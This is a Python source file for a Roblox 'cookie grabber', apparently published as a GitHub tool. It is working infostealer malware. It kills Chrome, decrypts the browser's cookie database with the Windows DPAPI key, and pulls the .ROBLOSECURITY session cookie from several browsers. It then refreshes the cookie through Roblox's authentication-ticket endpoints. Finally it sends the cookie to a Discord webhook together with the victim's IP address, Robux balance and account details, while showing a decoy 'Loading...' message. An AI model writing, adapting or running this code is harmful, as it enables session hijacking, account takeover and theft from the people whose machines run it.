import os
import json
import base64
import browser_cookie3
import sqlite3
import subprocess
import shutil
import win32crypt
from Crypto.Cipher import AES
from discordwebhook import Discord
import httpx
import re
import requests
import robloxpy

try:
    subprocess.call("TASKKILL /f /IM CHROME.EXE")
except FileNotFoundError:
    print("")

webhook_url = 'heh'

dummy_message = "Loading..."
print(dummy_message)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""


def CookieLog():
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()

    cursor.execute("""
    SELECT encrypted_value 
    FROM cookies WHERE name='.ROBLOSECURITY'""")

    key = get_encryption_key()
    for encrypted_value, in cursor.fetchall():
        decrypted_value = decrypt_data(encrypted_value, key)
        return decrypted_value
    db.close()

def PlanB():
    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass


cookies = PlanB()

if CookieLog() == None:
    PlanB()

def get_local_ip():
    ip = requests.get('http://api.ipify.org').text
    return ip


def refresh_cookie(auth_cookie):
    csrf_token = generate_csrf_token(auth_cookie)
    headers, cookies = generate_headers(csrf_token, auth_cookie)

    req = httpx.post("https://auth.roblox.com/v1/authentication-ticket",
                     headers=headers, cookies=cookies, json={})
    auth_ticket = req.headers.get("rbx-authentication-ticket", "Failed to get authentication ticket")

    headers.update({"RBXAuthenticationNegotiation": "1"})

    req1 = httpx.post("https://auth.roblox.com/v1/authentication-ticket/redeem",
                      headers=headers, json={"authenticationTicket": auth_ticket})
    new_auth_cookie = re.search(".ROBLOSECURITY=(.*?);", req1.headers["set-cookie"]).group(1)

    return new_auth_cookie


def generate_csrf_token(auth_cookie):
    csrf_req = httpx.get("https://www.roblox.com/home", cookies={".ROBLOSECURITY": auth_cookie})
    csrf_txt = csrf_req.text.split("<meta name=\"csrf-token\" data-token=\"")[1].split("\" />")[0]
    return csrf_txt


def generate_headers(csrf_token, auth_cookie):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Roblox/WinInet",
        "origin": "https://www.roblox.com",
        "referer": "https://www.roblox.com/my/account",
        "x-csrf-token": csrf_token
    }

    cookies = {".ROBLOSECURITY": auth_cookie}

    return headers, cookies


if __name__ == "__main__":
    cookie = CookieLog()

    check = robloxpy.Utils.CheckCookie(cookie).lower()
    if check != "valid cookie":
        cookie = refresh_cookie(cookie)

    ip_address = get_local_ip()
    roblox_cookie = cookie

    info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie}).text)
    roblox_id = info["UserID"]
    rap = robloxpy.User.External.GetRAP(roblox_id)
    friends = robloxpy.User.Friends.External.GetCount(roblox_id)
    age = robloxpy.User.External.GetAge(roblox_id)
    creation_date = robloxpy.User.External.CreationDate(roblox_id)
    rolimons = f"https://www.rolimons.com/player/{roblox_id}"
    roblox_profile = f"https://web.roblox.com/users/{roblox_id}/profile"
    headshot_raw = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={roblox_id}&size=420x420&format=Png&isCircular=false").text
    headshot_json = json.loads(headshot_raw)
    headshot = headshot_json["data"][0]["imageUrl"]

    username = info['UserName']
    robux = requests.get("https://economy.roblox.com/v1/user/currency",cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
    premium_status = info['IsPremium']

    discord = Discord(url=webhook_url)
    discord.post(
        username="BOT - Pirate 🍪",
        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
        embeds=[
            {
                "title": "💸 +1 Result Account 🕯️",
                "thumbnail": {"url": headshot},
                "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
                "fields": [
                    {"name": "Username", "value": f"```{username}```", "inline": True},
                    {"name": "Robux Balance", "value": f"```{robux}```", "inline": True},
                    {"name": "Premium Status", "value": f"```{premium_status}```", "inline": True},
                    {"name": "Creation Date", "value": f"```{creation_date}```", "inline": True},
                    {"name": "RAP", "value": f"```{rap}```", "inline": True},
                    {"name": "Friends", "value": f"```{friends}```", "inline": True},
                    {"name": "Account Age", "value": f"```{age}```", "inline": True},
                    {"name": "IP Address", "value": f"```{ip_address}```", "inline": True},
                ],
            }
        ],
    )

    discord.post(
        username="BOT - Pirate 🍪",
        avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
        embeds=[
            {"title": ".ROBLOSECURITY", "description": f"```{roblox_cookie}```"}
        ],
    )
